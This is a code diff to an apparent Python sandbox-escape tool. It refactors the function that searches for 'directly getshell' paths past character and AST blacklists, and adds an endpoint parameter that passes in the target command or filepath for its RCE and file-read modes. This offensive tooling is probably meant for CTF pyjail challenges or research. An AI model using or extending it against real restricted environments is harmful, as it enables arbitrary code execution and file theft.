@@ -53,6 +53,7 @@ print(BANNER)
 
 def bypassMAIN(
     local_scope: Dict[str, Any] = None,
+    endpoint: str = None,
     banned_chr: list = [],
     allowed_chr: list = [],
     banned_ast: List[ast.AST] = [],
@@ -138,6 +139,17 @@ def bypassMAIN(
         "profile",
         "timeit",
     ]
+    log_level_ = log_level.upper()
+    if log_level_ not in ["DEBUG", "INFO", "TESTING"]:
+        logger.warning("[!] Invalid log level, using INFO instead.")
+        log_level_ = "INFO"
+    if log_level_ == "TESTING":
+        log_level_ = "CRITICAL"  # for test scripts
+    if log_level_ != "DEBUG":
+        from warnings import filterwarnings
+
+        filterwarnings("ignore")
+    logger.setLevel(log_level_)
     reminder = (
         {}
     )  # The reminder of bypass method that could not be used in remote (like inheritance chain)
@@ -155,19 +167,6 @@ def bypassMAIN(
                 "[!] Please, change a better shell to enable the unicode feature."
             )
             allow_unicode_bypass = False
-    log_level_ = log_level.upper()
-    if log_level_ not in ["DEBUG", "INFO", "QUIET"]:
-        logger.warning("[!] Invalid log level, using INFO instead.")
-        log_level_ = "INFO"
-    if log_level_ == "QUIET":
-        from os import devnull
-        log_level_ = "CRITICAL"  # for test scripts & QUIET mode
-        sys.stdout = open(devnull, "w")  # disable stdout
-    if log_level_ != "DEBUG":
-        from warnings import filterwarnings
-
-        filterwarnings("ignore")
-    logger.setLevel(log_level_)
     achivements = {}  # The progress we've gone so far. Being output in the end
     generated_path = (
         {}
@@ -370,6 +369,48 @@ Try to bypass blacklist with them. Please be paitent.",
                     generated_path[tag] = payload
                     achivements[module] = [payload, len(searched_modules[module])]
 
+    def get_simple_path():
+        simple_path = (
+            filter_path_list(RCE_data["directly_getshell"], tagged_scope)
+            if interactive and not is_builtins_rewrited
+            else []
+        )
+        if simple_path:
+            logger.info(
+                "[*] %d paths found to directly getshell. \
+Try to bypass blacklist with them. Please be paitent.",
+                len(simple_path),
+            )
+            logger.debug("[*] simple paths: %s", str([i[0] for i in simple_path]))
+            _ = try_bypasses(
+                simple_path,
+                banned_chr,
+                banned_ast,
+                banned_re,
+                max_length,
+                allow_unicode_bypass,
+                tagged_scope,
+            )
+            if _:
+                logger.info(
+                    "[+] directly getshell success. %d payload(s) in total.", len(_)
+                )
+                logger.debug("[*] payloads to directly getshell: ")
+                logger.debug(_)
+                logger.info(
+                    "[+] You now can use this payload to getshell directly with proper input."
+                )
+                achivements["directly input bypass"] = [_[0], len(_)]
+                if print_all_payload:
+                    bypasses_output(_)
+                bypasses_output(_[0])
+            else:
+                achivements["directly input bypass"] = ["None", 0]
+                logger.info("[-] no way to bypass blacklist to directly getshell.")
+        else:
+            achivements["directly input bypass"] = ["None", 0]
+            logger.info("[-] no paths found to directly getshell.")
+
     # Step1: Analyze and tag the local scope
     if "__builtins__" not in local_scope:
         local_scope["__builtins__"] = __builtins__
@@ -403,8 +444,8 @@ Try to bypass blacklist with them. Please be paitent.",
     obj_list = [i for i in tagged_scope]
     obj_list.sort(key=len)
 
-    string_ords = [ord(i) for i in ascii_letters + digits + "_ [](){}=:;`+?>*|&~'\".<"]
-
+    string_ords = [ord(i) for i in remove_duplicate(ascii_letters + digits + endpoint)]
+    get_simple_path()
     def check_all_collected():
         all_colleted = True
         for i in string_ords:
@@ -484,46 +525,7 @@ Try to bypass blacklist with them. Please be paitent.",
     logger.info("[*] int literals found: %s", int_dict)
 
     # Step2: Try to exec directly with simple paths
-    simple_path = (
-        filter_path_list(RCE_data["directly_getshell"], tagged_scope)
-        if interactive and not is_builtins_rewrited
-        else []
-    )
-    if simple_path:
-        logger.info(
-            "[*] %d paths found to directly getshell. \
-Try to bypass blacklist with them. Please be paitent.",
-            len(simple_path),
-        )
-        logger.debug("[*] simple paths: %s", str([i[0] for i in simple_path]))
-        _ = try_bypasses(
-            simple_path,
-            banned_chr,
-            banned_ast,
-            banned_re,
-            max_length,
-            allow_unicode_bypass,
-            tagged_scope,
-        )
-        if _:
-            logger.info(
-                "[+] directly getshell success. %d payload(s) in total.", len(_)
-            )
-            logger.debug("[*] payloads to directly getshell: ")
-            logger.debug(_)
-            logger.info(
-                "[+] You now can use this payload to getshell directly with proper input."
-            )
-            achivements["directly input bypass"] = [_[0], len(_)]
-            if print_all_payload:
-                bypasses_output(_)
-            bypasses_output(_[0])
-        else:
-            achivements["directly input bypass"] = ["None", 0]
-            logger.info("[-] no way to bypass blacklist to directly getshell.")
-    else:
-        achivements["directly input bypass"] = ["None", 0]
-        logger.info("[-] no paths found to directly getshell.")
+    get_simple_path()
 
     # Step3: Try to find generators
     try_to_restore("generator", (a for a in ()).gi_frame.__class__)
@@ -822,11 +824,12 @@ def bypassRCE(
     """
     if cmd == "":
         logger.critical("[!] command is empty, nothing to execute.")
-        quit(1)
+        exit(1)
 
     generated_path = bypassMAIN(
         local_scope,
         banned_chr=banned_chr,
+        endpoint=cmd,
         allowed_chr=allowed_chr,
         banned_ast=banned_ast,
         banned_re=banned_re,
@@ -889,9 +892,10 @@ def bypassREAD(
     """
     if filepath == "":
         logger.critical("[!] filepath is empty, nothing to read.")
-        quit(1)
+        exit(1)
     generated_path = bypassMAIN(
         local_scope,
+        endpoint=filepath,
         banned_chr=banned_chr,
         allowed_chr=allowed_chr,
         banned_ast=banned_ast,
@@ -907,7 +911,7 @@ def bypassREAD(
     mode = mode.lower()
     if mode not in ["eval", "exec"]:
         logger.critical('[!] mode must be either "eval" or "exec".')
-        quit(1)
+        exit(1)
     try_to_restore("filecontentsio", cmd=filepath)
     try_to_restore("filecontentstring", cmd=filepath)
     if mode == "eval":
